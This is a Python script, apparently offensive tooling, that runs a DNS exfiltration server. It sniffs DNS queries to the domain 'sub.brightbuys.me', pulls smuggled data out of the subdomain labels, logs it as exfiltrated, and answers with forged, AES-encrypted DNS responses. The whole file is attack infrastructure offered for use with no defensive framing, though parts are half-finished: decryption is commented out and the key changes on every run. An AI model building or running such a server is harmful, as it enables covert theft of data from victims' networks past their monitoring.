from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import threading
import base64
import os

# Constants
PORT = 53
DOMAIN = "sub.brightbuys.me"  # Replace with your target domain
SAVE_PATH = "./logs"

# AES key and IV generation
aes_key = get_random_bytes(32)  # 256-bit AES key
aes_iv = get_random_bytes(16)   # Initialization vector


# AES Encryption
def encrypt_aes(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(iv + encrypted_data).decode('utf-8')


# AES Decryption
def decrypt_aes(data, key):
    try:
        data = base64.b64decode(data)
        iv = data[:16]
        encrypted_message = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None


# Function to forge DNS responses based on query type
def forge_dns_response(pkt, rdata="", rcode=0):
    d = pkt[IP].src
    dp = pkt[UDP].sport
    id = pkt[DNS].id
    q = pkt[DNS].qd
    reply = IP(dst=d)/UDP(dport=dp)/DNS(id=id, qr=1, rd=1, ra=1, rcode=rcode, qd=q)

    # Handle different DNS query types (e.g., A, NS, TXT, MX)
    qtype = pkt[DNSQR].qtype
    if qtype == 1:  # A record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='A', ttl=60, rdata=rdata or "127.0.0.1")
    elif qtype == 2:  # NS record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='NS', ttl=3600, rdata=f"ns.{DOMAIN}")
    elif qtype == 16:  # TXT record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='TXT', ttl=60, rdata=rdata or "example response")
    else:
        reply.rcode = 3  # NXDOMAIN for unsupported query types

    send(reply, verbose=0)


# DNS Packet handler that processes queries and encrypts/decrypts data
def handle_dns_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].opcode == 0:  # DNS query
        domain = packet[DNSQR].qname.decode()

        if DOMAIN in domain:
            # Extract and decrypt the data
            encrypted_data = domain.replace(f".{DOMAIN}.", "")
            
            decrypted_data = encrypted_data
            # decrypted_data = decrypt_aes(encrypted_data, aes_key)

            if decrypted_data:
                print(f"Exfiltrated data (decrypted): {decrypted_data}")

                # Prepare and encrypt the response
                response_data = f"Received: {decrypted_data}"
                encrypted_response = encrypt_aes(response_data, aes_key, aes_iv)

                # Forge and send DNS response
                forge_dns_response(packet, rdata=encrypted_response)
            else:
                print(f"Decryption failed for domain: {domain}")
        else:
            print(f"Unrelated DNS request: {domain}")


# Start a DNS packet listener in a separate thread
def start_listener():
    sniff(filter=f"udp port {PORT}", prn=handle_dns_packet)


# Main function to start the multi-threaded DNS server
if __name__ == "__main__":
    print("Starting DNS exfiltration server...")

    # Multi-threading to handle DNS packets asynchronously
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True  # Run in the background
    listener_thread.start()

    # Main thread continues, allowing for other operations (e.g., user commands)
    while True:
        command = input("Enter 'quit' to stop the server: ")
        if command == 'quit':
            break

    print("Stopping the DNS exfiltration server...")

